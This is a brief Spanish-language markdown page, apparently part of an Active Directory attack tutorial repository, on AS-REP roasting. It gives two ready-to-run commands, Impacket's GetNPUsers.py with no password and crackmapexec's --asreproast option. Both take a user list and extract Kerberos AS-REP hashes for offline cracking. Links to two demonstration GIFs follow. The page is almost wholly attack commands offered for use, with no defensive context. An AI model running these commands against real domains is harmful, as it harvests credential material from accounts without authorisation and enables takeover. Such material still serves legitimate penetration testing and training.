# Obteniendo ASEREPROastable users hash

```
python /usr/share/doc/python3-impacket/examples/GetNPUsers.py <nombre dominio completo>/ -no-pass -usersfile <txt de lista de usuarios>
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/user_but_no_credentials/ASEREPRoast/vid.gif?raw=true "hash ASREP con GetNPUsers")

```
poetry run crackmapexec ldap <direccion ip> -u <txt de lista de usuarios> -p '' --asreproast <output.txt>
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/user_but_no_credentials/ASEREPRoast/vid2.gif?raw=true "hash ASREP con Crackmapexec")
